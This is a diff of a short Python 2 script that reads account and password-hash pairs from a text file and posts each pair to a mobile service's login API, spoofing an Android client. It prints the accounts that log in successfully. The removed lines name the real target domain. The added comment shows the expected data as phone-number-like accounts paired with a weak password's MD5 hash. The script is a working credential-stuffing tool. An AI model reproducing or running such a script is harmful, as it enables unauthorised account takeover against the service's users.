@@ -4,13 +4,14 @@
 @author: sunyx
 '''
 import requests
-import json
 import re
-#import ssl,socket,time,OpenSSL 
-
-#context = OpenSSL.SSL.Context(ssl.PROTOCOL_SSLv23)
-#context.load_cert_chain(certfile='www.fencard.com.pfx')
-
+'''
+数据格式
+(158x,E10ADC3949BA59ABBE56E057F20F883E),
+(258x,E10ADC3949BA59ABBE56E057F20F883E),
+(358x,E10ADC3949BA59ABBE56E057F20F883E),
+(768x,E10ADC3949BA59ABBE56E057F20F883E)
+'''
 
 result= []
 of = open('datatext.txt','r')
@@ -25,27 +26,13 @@ for fd in fs:
     login_account = fd[0]
     login_pwd = fd[1]
     #print 'login_account:',login_account,'login_pwd:',login_pwd
-    url = 'https://www.fencard.com/serviceoperate.svc/logincommit';
-    header = {'Accept-Encoding': 'gzip,deflate',
-              'Content-Type': 'application/json;charset=UTF-8',
-              'Host': 'www.fencard.com',
-              'Connection': 'Keep-Alive',
-              'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)'
-              }
+    url = 'https://www.xxxx.com/serviceoperate.svc/logincommit';
     jsondata = {'account':login_account,
             'password':login_pwd,
-            'sp':{"cv":"1.0","from":"android","iv":"1","m":"GT-I9505","o":"KOT49H","v":"4.4.2"},
-            'Accept-Encoding': 'gzip,deflate',
-            'Content-Type': 'application/json;charset=UTF-8',
-            'Host': 'www.fencard.com',
-            'Connection': 'Keep-Alive',
-            'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)'}
-    #request.add_header('Content-Type': 'application/json;charset=UTF-8')
+            'sp':{"cv":"1.0","from":"android","iv":"1","m":"GT-I9505","o":"KOT49H","v":"4.4.2"}
+            }
     rs = requests.post(url,json=jsondata)
-    #print jsondata
     rf = rs.text
-    #print rf
-    #print rf.decode('utf-8')
     isrf = re.findall(u'\"msg\":\"成功\",\"status\":2000',rf)
     if bool(isrf):
         print login_account,'登录成功'
